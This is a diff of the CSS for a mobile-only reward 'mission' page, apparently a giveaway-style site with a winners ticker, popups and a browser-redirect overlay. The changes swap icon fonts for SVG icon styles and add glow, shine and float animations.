@@ -18,14 +18,8 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700;800&family=Orbitron:wght@500;700;900&family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
-        /* ✅ ANTI-LAG: Reduce expensive operations */
-        html { -webkit-text-size-adjust: 100%; }
         html, body { overflow-x: hidden; overscroll-behavior-y: auto; }
         body {
             font-family: 'Poppins', 'Fredoka', sans-serif;
@@ -41,26 +35,32 @@
             background-attachment: fixed;
         }
 
-        /* ✅ ANTI-LAG: GPU acceleration + containment */
-        .mission-card,
-        .popup-card,
-        #intentBlock .intent-card {
-            will-change: transform;
-            transform: translateZ(0);
-            -webkit-backface-visibility: hidden;
-            backface-visibility: hidden;
+        /* ============================================================
+           SVG ICON STYLES (button icons)
+           ============================================================ */
+        .btn-svg-icon {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+            display: inline-block;
+            vertical-align: middle;
+            filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3));
+            transition: transform 0.15s ease;
         }
+        .btn-svg-icon.lg { width: 24px; height: 24px; }
+        .btn-svg-icon.sm { width: 16px; height: 16px; }
 
         /* MOBILE-ONLY GUARD */
         #desktopBlock { display: none; position: fixed; inset: 0; z-index: 999999; background: linear-gradient(160deg, #0a1535 0%, #050a1a 100%); color: #fff; font-family: 'Poppins', sans-serif; text-align: center; padding: 24px; flex-direction: column; align-items: center; justify-content: center; }
-        #desktopBlock .block-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(77, 109, 255, 0.7)); }
+        #desktopBlock .block-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 25px rgba(77, 109, 255, 0.7)); animation: blockPulse 2.2s ease-in-out infinite; }
         #desktopBlock h1 { font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; letter-spacing: 3px; background: linear-gradient(180deg, #6ea8ff 0%, #1a3dff 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 14px; }
         #desktopBlock p { font-size: 14px; line-height: 1.7; color: rgba(255, 255, 255, 0.85); max-width: 340px; }
         #desktopBlock .block-badge { margin-top: 20px; padding: 8px 22px; border-radius: 30px; background: rgba(77, 109, 255, 0.15); border: 2px solid rgba(110, 168, 255, 0.5); font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 800; letter-spacing: 3px; color: #6ea8ff; }
+        @keyframes blockPulse { 0%, 100% { transform: scale(1); opacity: 0.85; } 50% { transform: scale(1.1); opacity: 1; } }
         @media (hover: hover) and (pointer: fine), (min-width: 769px) { #desktopBlock { display: flex !important; } #missionApp { display: none !important; } }
 
         /* ============================================================
-           ✅ INTENT / BROWSER GUARD — SCROLLABLE + ANTI-LAG
+           ✅ INTENT / BROWSER GUARD — REMASTERED
            ============================================================ */
         #intentBlock {
             display: none;
@@ -82,6 +82,16 @@
             -webkit-overflow-scrolling: touch;
             overscroll-behavior: contain;
         }
+        #intentBlock::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: conic-gradient(from 0deg at 50% 30%, rgba(255, 255, 255, 0.06) 0deg, transparent 30deg, rgba(255, 255, 255, 0.06) 60deg, transparent 90deg, rgba(255, 255, 255, 0.06) 120deg, transparent 150deg, rgba(255, 255, 255, 0.06) 180deg, transparent 210deg, rgba(255, 255, 255, 0.06) 240deg, transparent 270deg, rgba(255, 255, 255, 0.06) 300deg, transparent 330deg, rgba(255, 255, 255, 0.06) 360deg);
+            animation: raysRotate 30s linear infinite;
+            opacity: 0.7;
+            pointer-events: none;
+            z-index: 0;
+        }
         #intentBlock .intent-card {
             position: relative;
             z-index: 2;
@@ -92,14 +102,23 @@
             border-radius: 32px;
             padding: 34px 24px 30px;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 40px rgba(110, 168, 255, 0.4), inset 0 0 40px rgba(255, 255, 255, 0.08);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.55), 0 0 60px rgba(110, 168, 255, 0.55), inset 0 0 40px rgba(255, 255, 255, 0.08);
             overflow: hidden;
+            animation: cardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             margin: auto 0;
             flex-shrink: 0;
-            animation: cardEnter 0.5s ease;
+        }
+        #intentBlock .intent-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 60%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent);
+            transform: skewX(-20deg);
+            animation: cardShine 4s ease-in-out infinite;
+            pointer-events: none;
         }
 
-        /* Intent badge */
         #intentBlock .intent-badge {
             display: inline-flex;
             align-items: center;
@@ -114,8 +133,9 @@
             letter-spacing: 2.5px;
             color: #4a1f00;
             margin-bottom: 20px;
-            box-shadow: 0 4px 0 #a66900;
+            box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.7);
             text-transform: uppercase;
+            animation: badgeGlow 2.5s ease-in-out infinite;
         }
         #intentBlock .intent-badge .badge-dot {
             width: 8px;
@@ -126,7 +146,6 @@
             animation: dotPulse 1.2s infinite;
         }
 
-        /* Intent image */
         #intentBlock .intent-image-wrap {
             position: relative;
             width: 100%;
@@ -136,6 +155,16 @@
             align-items: center;
             justify-content: center;
         }
+        #intentBlock .intent-image-wrap::before {
+            content: '';
+            position: absolute;
+            inset: -20px;
+            background: radial-gradient(circle at center, rgba(255, 215, 0, 0.5) 0%, rgba(110, 168, 255, 0.3) 40%, transparent 70%);
+            border-radius: 50%;
+            filter: blur(20px);
+            animation: imgGlow 3s ease-in-out infinite;
+            z-index: 0;
+        }
         #intentBlock .intent-image {
             position: relative;
             z-index: 1;
@@ -144,10 +173,10 @@
             height: auto;
             display: block;
             border-radius: 20px;
-            filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.5));
+            filter: drop-shadow(0 12px 28px rgba(0, 0, 0, 0.55)) drop-shadow(0 0 28px rgba(255, 215, 0, 0.5));
+            animation: imgFloat 3s ease-in-out infinite;
         }
 
-        /* Intent title */
         #intentBlock .intent-title {
             font-family: 'Fredoka', sans-serif;
             font-size: 26px;
@@ -158,6 +187,7 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
+            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.75));
             margin-bottom: 12px;
             text-transform: uppercase;
         }
@@ -168,10 +198,12 @@
             line-height: 1.6;
             color: rgba(255, 255, 255, 0.92);
             margin-bottom: 8px;
+            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
         }
         #intentBlock .intent-subtitle strong {
             color: #ffe066;
             font-weight: 800;
+            text-shadow: 0 0 12px rgba(255, 215, 0, 0.75);
         }
         #intentBlock .intent-danger-text {
             font-family: 'Poppins', sans-serif;
@@ -179,10 +211,10 @@
             font-weight: 700;
             color: #ff8888;
             margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
             letter-spacing: 0.3px;
         }
 
-        /* Divider */
         #intentBlock .intent-divider {
             display: flex;
             align-items: center;
@@ -200,9 +232,9 @@
         #intentBlock .intent-divider .star {
             font-size: 12px;
             color: #ffe066;
+            filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.9));
         }
 
-        /* Steps box */
         #intentBlock .intent-steps {
             display: block;
             background: rgba(0, 0, 0, 0.38);
@@ -214,6 +246,7 @@
             line-height: 2;
             color: rgba(255, 255, 255, 0.92);
             text-align: left;
+            box-shadow: 0 0 12px rgba(255, 215, 0, 0.35), inset 0 0 10px rgba(255, 215, 0, 0.1);
             margin-bottom: 26px;
         }
         #intentBlock .intent-steps .steps-title {
@@ -225,6 +258,7 @@
             letter-spacing: 1.8px;
             margin-bottom: 8px;
             text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
         }
         #intentBlock .intent-steps strong { color: #ffe066; font-weight: 800; }
         #intentBlock .intent-steps .step-num {
@@ -244,40 +278,50 @@
             vertical-align: middle;
         }
 
-        /* Button */
         #intentBlock .auto-open-btn {
             position: relative;
             width: 100%;
-            padding: 20px 24px;
+            padding: 18px 24px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
+            gap: 10px;
             background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%);
             border: 3px solid #ffffff;
             border-radius: 18px;
             font-family: 'Orbitron', monospace;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 900;
             letter-spacing: 2.5px;
             text-transform: uppercase;
             color: #4a1f00;
             cursor: pointer;
             overflow: hidden;
-            box-shadow: 0 5px 0 #a66900, 0 8px 20px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65);
             transition: transform 0.12s ease, box-shadow 0.12s ease;
+            animation: btnPulse 2.4s ease-in-out infinite;
             margin-bottom: 20px;
         }
+        #intentBlock .auto-open-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 60%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);
+            transform: skewX(-20deg);
+            animation: btnShine 2.5s ease-in-out infinite;
+        }
         #intentBlock .auto-open-btn:active {
-            transform: translateY(5px);
+            transform: translateY(6px);
             box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5);
         }
-        #intentBlock .auto-open-btn .btn-icon {
-            font-size: 20px;
-            display: inline-block;
+        #intentBlock .auto-open-btn svg {
+            width: 22px;
+            height: 22px;
+            flex-shrink: 0;
+            animation: iconRocketFloat 1.6s ease-in-out infinite;
         }
 
-        /* Bottom note */
         #intentBlock .intent-note {
             display: flex;
             align-items: center;
@@ -293,135 +337,240 @@
             border: 1px solid rgba(57, 255, 20, 0.3);
             border-radius: 12px;
         }
-        #intentBlock .intent-note i {
+        #intentBlock .intent-note svg {
+            width: 14px;
+            height: 14px;
             color: #39ff14;
-            font-size: 12px;
+            filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.9));
+            flex-shrink: 0;
         }
 
-        /* WINNERS TICKER */
-        .winners-ticker { position: fixed; top: 12px; left: 50%; transform: translateX(-50%) translateZ(0); z-index: 500; display: flex; align-items: center; gap: 8px; padding: 8px 18px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(0, 0, 0, 0.4)); border: 2px solid #ffe066; border-radius: 30px; box-shadow: 0 4px 0 #a66900; max-width: calc(100% - 30px); }
-        .winners-ticker .ticker-live-dot { width: 8px; height: 8px; border-radius: 50%; background: #39ff14; box-shadow: 0 0 10px #39ff14; animation: livePulse 1.5s ease-in-out infinite; flex-shrink: 0; }
-        @keyframes livePulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.85); } }
-        .winners-ticker .ticker-text { font-family: 'Poppins', sans-serif; font-size: 11px; font-weight: 600; color: #fff; white-space: nowrap; display: flex; align-items: center; gap: 5px; transition: opacity 0.3s ease; }
-        .winners-ticker .ticker-text .ticker-gc-icon { width: 14px; height: 14px; vertical-align: middle; }
-        .winners-ticker .ticker-text .ticker-amount { color: #ffe066; font-weight: 900; }
-        .winners-ticker.fade-out .ticker-text { opacity: 0; }
-        .winners-ticker.fade-in .ticker-text { opacity: 1; }
+        /* ============================================================
+           WINNERS TICKER
+           ============================================================ */
+        .winners-ticker { position: fixed; top: 12px; left: 50%; transform: translateX(-50%); z-index: 500; display: flex; align-items: center; gap: 8px; padding: 8px 18px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(0, 0, 0, 0.4)); border: 2px solid #ffe066; border-radius: 30px; box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); max-width: calc(100% - 30px); animation: tickerGlow 3s ease-in-out infinite; }
+        @keyframes tickerGlow { 0%, 100% { box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.6), inset 0 0 15px rgba(255, 215, 0, 0.15); } 50% { box-shadow: 0 4px 0 #a66900, 0 0 45px rgba(255, 215, 0, 0.95), inset 0 0 20px rgba(255, 215, 0, 0.25); } }
+        .winners-ticker .ticker-live-dot { width: 8px; height: 8px; border-radius: 50%; background: #39ff14; box-shadow: 0 0 10px #39ff14; animation: livePulse 1.2s ease-in-out infinite; flex-shrink: 0; }
+        @keyframes livePulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.75); } }
+        .winners-ticker .ticker-text { font-family: 'Poppins', sans-serif; font-size: 11px; font-weight: 600; color: #fff; white-space: nowrap; display: flex; align-items: center; gap: 5px; transition: opacity 0.3s ease, transform 0.3s ease; }
+        .winners-ticker .ticker-text .ticker-gc-icon { width: 14px; height: 14px; vertical-align: middle; filter: drop-shadow(0 0 5px rgba(255, 215, 0, 0.8)); }
+        .winners-ticker .ticker-text .ticker-amount { color: #ffe066; font-weight: 900; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
+        .winners-ticker.fade-out .ticker-text { opacity: 0; transform: translateY(-6px); }
+        .winners-ticker.fade-in .ticker-text { opacity: 1; transform: translateY(0); }
 
-        /* BACKGROUND EFFECTS — REDUCED FOR PERFORMANCE */
-        .bg-rays { display: none; }
-        .bg-glow { display: none; }
-        .coin { display: none; }
-        .sparkle { display: none; }
-        .confetti { display: none; }
+        /* ============================================================
+           BACKGROUND EFFECTS
+           ============================================================ */
+        .bg-rays { position: fixed; inset: 0; z-index: 0; pointer-events: none; background: conic-gradient(from 0deg at 50% 30%, rgba(255, 255, 255, 0.06) 0deg, transparent 30deg, rgba(255, 255, 255, 0.06) 60deg, transparent 90deg, rgba(255, 255, 255, 0.06) 120deg, transparent 150deg, rgba(255, 255, 255, 0.06) 180deg, transparent 210deg, rgba(255, 255, 255, 0.06) 240deg, transparent 270deg, rgba(255, 255, 255, 0.06) 300deg, transparent 330deg, rgba(255, 255, 255, 0.06) 360deg); animation: raysRotate 30s linear infinite; opacity: 0.7; }
+        @keyframes raysRotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .bg-glow { position: fixed; bottom: -20%; left: 50%; transform: translateX(-50%); width: 140%; height: 60%; background: radial-gradient(ellipse at center, rgba(110, 168, 255, 0.45) 0%, rgba(77, 109, 255, 0.25) 30%, transparent 70%); z-index: 0; pointer-events: none; filter: blur(30px); animation: glowPulse 4s ease-in-out infinite; }
+        @keyframes glowPulse { 0%, 100% { opacity: 0.75; transform: translateX(-50%) scale(1); } 50% { opacity: 1; transform: translateX(-50%) scale(1.05); } }
+        .coin { position: fixed; z-index: 1; font-size: 26px; opacity: 0; pointer-events: none; filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.9)); animation: coinFloat linear infinite; }
+        @keyframes coinFloat { 0% { transform: translateY(110vh) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-20vh) rotate(720deg); opacity: 0; } }
+        .sparkle { position: fixed; z-index: 1; width: 6px; height: 6px; border-radius: 50%; background: #fff; box-shadow: 0 0 10px #fff, 0 0 20px #6ea8ff, 0 0 30px #4d6dff; pointer-events: none; animation: sparkleTwinkle 2.4s ease-in-out infinite; }
+        @keyframes sparkleTwinkle { 0%, 100% { opacity: 0; transform: scale(0.4); } 50% { opacity: 1; transform: scale(1.2); } }
+        .confetti { position: fixed; top: -20px; width: 8px; height: 12px; z-index: 1; opacity: 0; pointer-events: none; animation: confettiFall 6s linear infinite; }
+        @keyframes confettiFall { 0% { transform: translateY(-20px) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
 
-        /* MAIN APP */
+        /* ============================================================
+           MAIN APP
+           ============================================================ */
         #missionApp { position: relative; z-index: 10; min-height: 100vh; min-height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 70px 18px 40px; }
-        .mission-card { position: relative; width: 100%; max-width: 420px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 32px; padding: 36px 22px 28px; text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 40px rgba(110, 168, 255, 0.4), inset 0 0 40px rgba(255, 255, 255, 0.08); overflow: hidden; animation: cardEnter 0.5s ease; }
-        @keyframes cardEnter { 0% { transform: scale(0.9) translateY(20px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
-        .mission-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ffe066 0%, #ffb300 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #4a1f00; margin-bottom: 18px; box-shadow: 0 4px 0 #a66900; text-transform: uppercase; }
+        .mission-card { position: relative; width: 100%; max-width: 420px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 32px; padding: 36px 22px 28px; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.55), 0 0 60px rgba(110, 168, 255, 0.55), inset 0 0 40px rgba(255, 255, 255, 0.08); overflow: hidden; animation: cardEnter 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes cardEnter { 0% { transform: scale(0.85) translateY(30px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
+        .mission-card::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.35), transparent); transform: skewX(-20deg); animation: cardShine 4s ease-in-out infinite; pointer-events: none; }
+        @keyframes cardShine { 0% { left: -100%; } 40% { left: 150%; } 100% { left: 150%; } }
+        .mission-badge { display: inline-flex; align-items: center; gap: 8px; padding: 6px 18px; background: linear-gradient(180deg, #ffe066 0%, #ffb300 100%); border: 2px solid #fff; border-radius: 30px; font-family: 'Orbitron', monospace; font-size: 10px; font-weight: 900; letter-spacing: 2.5px; color: #4a1f00; margin-bottom: 18px; box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.7); text-transform: uppercase; animation: badgeGlow 2.5s ease-in-out infinite; }
+        @keyframes badgeGlow { 0%, 100% { box-shadow: 0 4px 0 #a66900, 0 0 25px rgba(255, 215, 0, 0.7); } 50% { box-shadow: 0 4px 0 #a66900, 0 0 45px rgba(255, 215, 0, 1); } }
         .mission-badge .badge-dot { width: 8px; height: 8px; border-radius: 50%; background: #ff3b3b; box-shadow: 0 0 10px #ff3b3b; animation: dotPulse 1.2s infinite; }
-        @keyframes dotPulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.85); } }
+        @keyframes dotPulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.75); } }
         .mission-image-wrap { position: relative; width: 100%; max-width: 320px; margin: 0 auto 22px; display: flex; align-items: center; justify-content: center; }
-        .mission-image { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 22px; filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.5)); }
-        .mission-title { font-family: 'Fredoka', sans-serif; font-size: 28px; font-weight: 900; line-height: 1.15; letter-spacing: 1px; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 75%, #ff8800 100%); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 10px; text-transform: uppercase; }
-        .mission-subtitle { font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.92); margin-bottom: 22px; }
-        .mission-subtitle strong { color: #ffe066; font-weight: 800; }
+        .mission-image-wrap::before { content: ''; position: absolute; inset: -20px; background: radial-gradient(circle at center, rgba(255, 215, 0, 0.45) 0%, rgba(110, 168, 255, 0.25) 40%, transparent 70%); border-radius: 50%; filter: blur(18px); animation: imgGlow 3s ease-in-out infinite; z-index: 0; }
+        @keyframes imgGlow { 0%, 100% { opacity: 0.7; transform: scale(1); } 50% { opacity: 1; transform: scale(1.08); } }
+        .mission-image { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 22px; filter: drop-shadow(0 10px 25px rgba(0, 0, 0, 0.5)) drop-shadow(0 0 25px rgba(255, 215, 0, 0.5)); animation: imgFloat 3s ease-in-out infinite; }
+        @keyframes imgFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+        .mission-title { font-family: 'Fredoka', sans-serif; font-size: 28px; font-weight: 900; line-height: 1.15; letter-spacing: 1px; background: linear-gradient(180deg, #ffffff 0%, #ffe066 40%, #ffb300 75%, #ff8800 100%); -webkit-background-clip: text; background-clip: text; color: transparent; filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.75)); margin-bottom: 10px; text-transform: uppercase; }
+        .mission-subtitle { font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 500; line-height: 1.6; color: rgba(255, 255, 255, 0.92); margin-bottom: 22px; text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4); }
+        .mission-subtitle strong { color: #ffe066; font-weight: 800; text-shadow: 0 0 12px rgba(255, 215, 0, 0.75); }
         .mission-divider { display: flex; align-items: center; justify-content: center; gap: 10px; margin: 18px auto; width: 80%; }
         .mission-divider .line { flex: 1; height: 2px; background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.9), transparent); border-radius: 2px; }
-        .mission-divider .star { font-size: 12px; color: #ffe066; }
+        .mission-divider .star { font-size: 12px; color: #ffe066; filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.9)); }
         .mission-chips { display: flex; justify-content: center; gap: 6px; margin-bottom: 22px; flex-wrap: wrap; }
-        .mission-chip { display: flex; align-items: center; gap: 5px; padding: 7px 12px; background: rgba(0, 0, 0, 0.35); border: 1.5px solid rgba(255, 215, 0, 0.7); border-radius: 14px; font-family: 'Orbitron', monospace; font-size: 9px; font-weight: 800; color: #ffe066; letter-spacing: 1.2px; text-transform: uppercase; }
+        .mission-chip { display: flex; align-items: center; gap: 5px; padding: 7px 12px; background: rgba(0, 0, 0, 0.35); border: 1.5px solid rgba(255, 215, 0, 0.7); border-radius: 14px; font-family: 'Orbitron', monospace; font-size: 9px; font-weight: 800; color: #ffe066; letter-spacing: 1.2px; text-transform: uppercase; box-shadow: 0 0 12px rgba(255, 215, 0, 0.35), inset 0 0 10px rgba(255, 215, 0, 0.1); }
         .mission-chip .chip-icon { font-size: 12px; }
-        .mission-btn { position: relative; width: 100%; padding: 18px 22px; display: flex; align-items: center; justify-content: center; gap: 10px; background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%); border: 3px solid #ffffff; border-radius: 18px; font-family: 'Orbitron', monospace; font-size: 15px; font-weight: 900; letter-spacing: 2.5px; text-transform: uppercase; color: #4a1f00; cursor: pointer; overflow: hidden; box-shadow: 0 5px 0 #a66900, 0 8px 20px rgba(0, 0, 0, 0.5); transition: transform 0.12s ease, box-shadow 0.12s ease; }
-        .mission-btn:active { transform: translateY(5px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
-        .mission-btn .btn-icon { font-size: 18px; }
-        .mission-note { margin-top: 18px; font-family: 'Poppins', sans-serif; font-size: 10px; font-weight: 500; color: rgba(255, 255, 255, 0.7); display: flex; align-items: center; justify-content: center; gap: 6px; }
-        .mission-note i { color: #39ff14; }
 
-        /* POPUPS */
-        .popup-overlay { display: none; position: fixed; inset: 0; z-index: 99999; background: rgba(5, 10, 30, 0.92); align-items: center; justify-content: center; padding: 20px; overflow-y: auto; -webkit-overflow-scrolling: touch; }
+        /* ============================================================
+           REMASTERED BUTTONS with SVG icons
+           ============================================================ */
+        .mission-btn {
+            position: relative;
+            width: 100%;
+            padding: 18px 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: linear-gradient(180deg, #fff9c4 0%, #ffe066 25%, #ffb300 65%, #ff8800 100%);
+            border: 3px solid #ffffff;
+            border-radius: 18px;
+            font-family: 'Orbitron', monospace;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            color: #4a1f00;
+            cursor: pointer;
+            overflow: hidden;
+            box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65);
+            transition: transform 0.12s ease, box-shadow 0.12s ease;
+            animation: btnPulse 2.4s ease-in-out infinite;
+        }
+        @keyframes btnPulse { 0%, 100% { box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 40px rgba(255, 215, 0, 0.65); } 50% { box-shadow: 0 6px 0 #a66900, 0 10px 25px rgba(0, 0, 0, 0.55), 0 0 65px rgba(255, 215, 0, 1); } }
+        .mission-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 60%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent); transform: skewX(-20deg); animation: btnShine 2.5s ease-in-out infinite; }
+        @keyframes btnShine { 0% { left: -100%; } 60% { left: 150%; } 100% { left: 150%; } }
+        .mission-btn:active { transform: translateY(6px); box-shadow: 0 0 0 #a66900, 0 4px 12px rgba(0, 0, 0, 0.5); }
+        .mission-btn svg { width: 22px; height: 22px; flex-shrink: 0; animation: iconRocketFloat 1.6s ease-in-out infinite; }
+        @keyframes iconRocketFloat {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-2px) rotate(-8deg); }
+        }
+
+        .mission-note { margin-top: 18px; font-family: 'Poppins', sans-serif; font-size: 10px; font-weight: 500; color: rgba(255, 255, 255, 0.7); letter-spacing: 0.5px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .mission-note svg { width: 12px; height: 12px; color: #39ff14; filter: drop-shadow(0 0 8px rgba(57, 255, 20, 0.8)); flex-shrink: 0; }
+
+        /* ============================================================
+           POPUPS
+           ============================================================ */
+        .popup-overlay { display: none; position: fixed; inset: 0; z-index: 99999; background: rgba(5, 10, 30, 0.92); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); align-items: center; justify-content: center; padding: 20px; animation: popupFadeIn 0.3s ease; overflow-y: auto; }
         .popup-overlay.show { display: flex; }
-        .popup-card { position: relative; width: 100%; max-width: 380px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 28px; padding: 30px 22px 24px; text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 40px rgba(110, 168, 255, 0.5); overflow: hidden; margin: auto; animation: popupEnter 0.35s ease; }
-        @keyframes popupEnter { 0% { transform: scale(0.9) translateY(20px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
-        .popup-close { position: absolute; top: 12px; right: 14px; width: 34px; height: 34px; background: rgba(255, 255, 255, 0.15); border: 2px solid #ffe066; border-radius: 50%; color: #ffe066; font-size: 16px; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 10; }
-        .popup-close:active { background: rgba(255, 68, 68, 0.5); color: #fff; }
+        @keyframes popupFadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .popup-card { position: relative; width: 100%; max-width: 380px; background: linear-gradient(180deg, rgba(255, 255, 255, 0.18) 0%, transparent 30%), linear-gradient(160deg, #4d6dff 0%, #1a3dff 45%, #0d1ecc 100%); border: 3px solid #a7c4ff; border-radius: 28px; padding: 30px 22px 24px; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7), 0 0 60px rgba(110, 168, 255, 0.65); animation: popupEnter 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); overflow: hidden; margin: auto; }
+        @keyframes popupEnter { 0% { transform: scale(0.7) translateY(30px); opacity: 0; } 100% { transform: scale(1) translateY(0); opacity: 1; } }
+        .popup-close { position: absolute; top: 12px; right: 14px; width: 34px; height: 34px; background: rgba(255, 255, 255, 0.15); border: 2px solid #ffe066; border-radius: 50%; color: #ffe066; font-size: 16px; font-weight: 900; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s ease; z-index: 10; }
+        .popup-close:hover, .popup-close:active { background: rgba(255, 68, 68, 0.5); color: #fff; transform: rotate(90deg) scale(1.1); border-color: #ff4444; }
+        .popup-close svg { width: 16px; height: 16px; }
         .popup-img-wrap { position: relative; width: 100%; max-width: 220px; margin: 8px auto 18px; display: flex; align-items: center; justify-content: center; }
-        .popup-img { position: relative; z-index: 1; width: 100%; max-width: 100%; height: auto; display: block; border-radius: 18px; filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.5)); }
